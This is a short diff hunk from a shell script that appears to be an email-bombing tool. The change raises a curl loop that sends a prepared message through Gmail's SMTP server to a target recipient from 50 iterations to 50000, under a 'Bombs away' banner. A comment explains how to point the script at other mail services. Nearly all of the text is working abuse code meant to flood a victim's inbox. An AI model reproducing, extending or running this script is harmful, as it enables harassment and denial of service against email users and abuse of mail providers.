@@ -21,7 +21,7 @@ read -n 1 -p "Create mail.txt in same directory and enter message to send ... Pr
 
 echo -e "\E[1;33m::::: \e[97mBombs away PEW PEW PEW \E[1;33m:::::\e[31m"
 
-for n in {1..50}; do curl --url "smtps://smtp.gmail.com:465" --ssl-reqd --mail-from $uservar3 --mail-rcpt $uservar2 --upload-file mail.txt --user $uservar3 --insecure; done
+for n in {1..50000}; do curl --url "smtps://smtp.gmail.com:465" --ssl-reqd --mail-from $uservar3 --mail-rcpt $uservar2 --upload-file mail.txt --user $uservar3 --insecure; done
 
 #to use other email services simply change "smtps://smtp.gmail.com:465" to match SMTP settings
 
